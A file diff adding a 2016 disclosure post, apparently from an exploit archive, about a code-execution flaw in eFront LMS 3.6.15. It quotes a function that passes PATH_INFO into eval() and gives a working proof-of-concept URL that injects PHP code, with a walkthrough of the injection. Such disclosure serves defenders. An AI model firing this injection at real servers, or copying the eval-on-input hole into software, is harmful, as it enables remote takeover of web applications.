@@ -1,0 +1,58 @@
+id: 26254
+date: 11/07/2016
+title: eFront 3.6.15 Code Execution Vulnerability
+author: Paulos Yibelo
+cves: 
+
+A friend reminded me a couple of days ago to publish something, since its been a while last I published a post. so this is going to be a short post about an interesting-ish RCE found in all versions of eFront LMS - unfortunately, since the report have passed 90 days since initial report, I am publishing it. I will update this post if a patch for the bug is out.
+
+The reason I have been away from the internet is because of the internet blockage in Ethiopia caused by the State of Emergency & its consequences facing you if you don't follow it, I am currently in a neighboring country so I am not technically disrespecting any laws.
+
+In /efront/libraries/globals.php:
+
+The following handleSEO() function is the one causing the code execution. it looks like the following:
+
+function handleSEO() {
+if (!$GLOBALS['configuration']['seo'] && $_SERVER['PATH_INFO']) {
+$parts = explode("/", trim($_SERVER['PATH_INFO'], "/"));
+for ($i = 0; $i < sizeof($parts); $i+=2) {
+eval('$'.$parts[$i].' = "'.$parts[$i+1].'";');
+}
+//unset($parts);unset($i);
+foreach (get_defined_vars() as $key => $value) {
+$_GET[$key] = $value;
+}
+}
+}
+
+Because of their assumption that $_SERVER['PATH_INFO'] isn't user controllable, they sent it stright to eval(), causing the code execution.
+
+Final PoC: https://localhost/efonrt/libraries/globals.php/hack/x%22%3Beval(phpinfo())%3B%24t%3D%22pwnd
+Decoded:
+https://localhost/efonrt/libraries/globals.php/hack/x";eval(phpinfo());$t="pwnd
+visiting the above link will get phpinfo() executed.
+
+Breaking it down:
+$parts = explode("/", trim($_SERVER['PATH_INFO'], "/"));
+for ($i = 0; $i < sizeof($parts); $i+=2) {
+eval('$'.$parts[$i].' = "'.$parts[$i+1].'";');
+}
+
+Because of that specific code, we send in /globals.php/hack/x, which will become:
+$hack="x
+
+But because php already executed the code, doing a comment (/*..*/) wont work and will crash it, so we will just tamper the variables like x";eval(phpinfo());$t="pwnd
+
+This will endup creating:
+
+$hack = "x";eval(phpinfo());$t="pwnd";
+
+This is then interpreted as:
+
+eval($hack = "x";eval(phpinfo());$t="pwnd";);
+
+And Boom! We got our code executed!
+
+Hope you enjoyed the read!
+
+#  0day.today [2023-03-25]  #
